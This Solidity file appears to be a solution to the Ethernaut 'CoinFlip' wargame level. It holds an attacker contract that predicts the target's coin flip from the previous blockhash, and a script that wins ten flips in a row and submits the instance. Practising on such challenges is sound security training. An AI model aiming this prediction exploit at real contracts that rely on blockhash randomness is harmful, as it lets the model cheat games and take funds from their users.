pragma solidity ^0.8.0;

import "./base.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract AutoFlipper {
    ICoinFlip flipper;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip _flipper) {
        flipper = _flipper;
    }

    function flip() external {
        console.log("guess", guess());
        flipper.flip(guess());
    }

    function guess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}

contract Ethernaut03 is Ethernaut {
    address constant factory =
        address(0x4dF32584890A0026e56f7535d0f2C6486753624f);

    function run() public {
        vm.startBroadcast();
        ICoinFlip flip = ICoinFlip(createNewInstance(factory));

        AutoFlipper autoFlipper = new AutoFlipper(flip);
        for (uint256 i = 0; i < 10; ++i) {
            console.log(block.number);
            autoFlipper.flip();
        }

        require(flip.consecutiveWins() == 10, "not won");
        submit(factory, address(flip));
        vm.stopBroadcast();
    }
}
